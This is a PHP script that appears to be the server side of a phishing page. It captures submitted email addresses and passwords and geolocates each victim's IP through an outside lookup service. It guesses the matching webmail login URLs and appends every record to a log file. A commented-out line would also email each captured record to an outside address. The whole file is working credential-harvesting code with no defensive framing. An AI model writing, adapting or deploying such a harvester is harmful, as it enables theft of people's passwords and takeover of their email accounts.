<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST["email"] ?? 'N/A';
    $password = $_POST["password"] ?? 'N/A';
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");

    // Get geo data
    $geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $country = $geo["country"] ?? "N/A";
    $region = $geo["regionName"] ?? "N/A";
    $city = $geo["city"] ?? "N/A";

    // Guess login URLs based on domain
    $domain = explode("@", $email)[1] ?? '';
    $login_urls = [
        "https://$domain",
        "https://mail.$domain",
        "https://webmail.$domain",
        "https://$domain/webmail"
    ];

    // Create message
    $message = "-----------------+ Log  +-----------------\n";
    $message .= "User ID         : $email\n";
    $message .= "Password        : $password\n";
    $message .= "IP Address      : $ip\n";
    $message .= "Country         : $country\n";
    $message .= "Region/State    : $region\n";
    $message .= "City            : $city\n";
    $message .= "Timestamp       : $timestamp\n";
    $message .= "Login URLs      : " . $login_urls[0] . "\n";
    for ($i = 1; $i < count($login_urls); $i++) {
        $message .= "                 : " . $login_urls[$i] . "\n";
    }
    $message .= "----------------------------------------\n\n";

    // Write to file
    file_put_contents("pdf.txt", $message, FILE_APPEND);

    // Optional: email it
   //mail("secktor7lugz@protonmail.com", "New Submission", $message);

     echo "1";   
    exit;
}
?>



